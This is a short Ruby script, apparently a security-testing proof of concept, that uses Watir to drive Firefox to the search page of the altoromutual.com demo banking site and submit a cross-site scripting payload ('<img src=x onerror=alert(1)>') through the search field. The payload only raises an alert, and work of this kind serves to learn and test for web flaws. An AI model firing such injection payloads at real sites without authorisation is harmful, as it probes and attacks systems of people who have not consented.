#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'watir'

browser = Watir::Browser.new :firefox
browser.goto "http://www.altoromutual.com/search.aspx?"
browser.text_field(name: 'txtSearch').set("<img src=x onerror='alert(1)'>")
btn = browser.button(value: 'Go')
puts btn.exists?
btn.click

# browser.close
